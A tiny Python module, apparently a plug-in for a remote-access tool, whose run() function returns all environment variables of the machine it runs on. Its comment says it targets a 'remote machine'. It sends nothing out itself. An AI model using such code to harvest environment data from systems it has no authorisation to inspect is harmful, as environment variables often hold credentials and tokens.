import os 

def run(**args):
    print("[*] In environment module.")
    return str(os.environ) #retrieves any environment variables that are set on the remote machine.
if __name__ == '__main__':
    run()
